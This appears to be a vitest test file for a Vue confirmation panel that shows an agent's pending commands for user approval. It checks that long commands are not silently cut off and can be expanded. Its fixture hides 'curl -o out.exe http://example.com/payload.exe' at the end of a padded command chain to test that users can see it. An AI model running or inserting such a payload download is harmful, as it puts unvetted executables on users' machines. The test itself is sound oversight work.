// P2-1 确认框展示保真：展示的必须是将要执行的东西。
// 此前 .arg-val 固定 max-height:60px 硬裁且无展开入口，长命令尾部的第二个动作
// （`A & B` 的 B）用户根本看不到。断言完整内容在 DOM 里，且提供展开入口。
import { mount } from '@vue/test-utils'
import { expect, it } from 'vitest'
import ConfirmPanel from '../ConfirmPanel.vue'

const LONG_CMD = 'echo hi & ' + 'A'.repeat(230) + ' & curl -o out.exe http://example.com/payload.exe'

function mountWith(args: Record<string, string>, tool = 'run_command') {
  return mount(ConfirmPanel, {
    props: {
      pending: [{
        request_id: 'r1',
        tool,
        args,
        danger: 'high',
        message: `要执行系统命令：\`${args.command ?? ''}\``,
        timeout: 60,
      }],
    },
  })
}

it('P2-1: renders the full long command, not a truncated prefix', () => {
  const wrapper = mountWith({ command: LONG_CMD })
  const val = wrapper.get('.arg-val')
  // 完整命令（含尾部动作）必须在 DOM 里，而不是被截断的前缀
  expect(val.text()).toBe(LONG_CMD)
  expect(val.text()).toContain('curl -o out.exe')
  wrapper.unmount()
})

it('P2-1: long arg is clamped by default but expandable', async () => {
  const wrapper = mountWith({ command: LONG_CMD })
  expect(wrapper.get('.arg-val').classes()).toContain('clamped')
  const toggle = wrapper.get('.arg-toggle')
  expect(toggle.text()).toContain('展开全文')
  await toggle.trigger('click')
  expect(wrapper.get('.arg-val').classes()).not.toContain('clamped')
  expect(wrapper.get('.arg-toggle').text()).toContain('收起')
  await wrapper.get('.arg-toggle').trigger('click')
  expect(wrapper.get('.arg-val').classes()).toContain('clamped')
  wrapper.unmount()
})

it('P2-1: short args are neither clamped nor given a toggle', () => {
  const wrapper = mountWith({ path: 'a.txt' }, 'write_file')
  expect(wrapper.get('.arg-val').classes()).not.toContain('clamped')
  expect(wrapper.find('.arg-toggle').exists()).toBe(false)
  wrapper.unmount()
})
